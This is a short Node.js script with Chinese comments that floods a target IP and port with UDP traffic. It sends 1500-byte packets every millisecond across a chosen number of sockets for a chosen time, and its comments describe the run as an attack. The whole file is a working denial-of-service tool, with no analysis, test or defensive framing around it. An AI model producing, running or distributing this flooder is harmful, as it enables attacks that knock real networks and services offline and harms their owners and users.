const dgram = require('dgram');

// 向目标发送 UDP 包的核心函数
const floodUDP = (targetIP, targetPort, duration) => {
  const client = dgram.createSocket('udp4');
  const message = Buffer.alloc(1500, 'A');  // 增加数据包大小 (1500字节，接近最大 MTU 大小)

  const sendFlood = () => {
    client.send(message, 0, message.length, targetPort, targetIP, (err) => {
      if (err) console.error('Send error:', err);
    });
  };

  // 定时发送数据包，发送频率提高到每毫秒一次
  const interval = setInterval(sendFlood, 1);  // 每 1 毫秒发送一个 UDP 包

  // 设置持续时间，攻击持续到时间结束
  setTimeout(() => {
    clearInterval(interval);
    client.close();
    console.log('Flood finished');
  }, duration * 1000);
};

// 处理并启动多个攻击线程
const startFlood = (targetIP, targetPort, duration, threads) => {
  for (let i = 0; i < threads; i++) {
    // 每个线程启动独立的 UDP flood
    floodUDP(targetIP, targetPort, duration);
  }
};

// 解析命令行参数
const args = process.argv.slice(2);
if (args.length !== 4) {
  console.log('Usage: node udpFlood.js <IP> <PORT> <THREADS> <TIME>');
  process.exit(1);
}

const targetIP = args[0];
const targetPort = parseInt(args[1]);
const threads = parseInt(args[2]);
const duration = parseInt(args[3]);

if (isNaN(targetPort) || isNaN(threads) || isNaN(duration)) {
  console.log('Error: PORT, THREADS, and TIME must be valid numbers');
  process.exit(1);
}

// 输出攻击开始的信息
console.log(`Starting UDP flood to ${targetIP}:${targetPort} for ${duration} seconds with ${threads} threads...`);
startFlood(targetIP, targetPort, duration, threads);
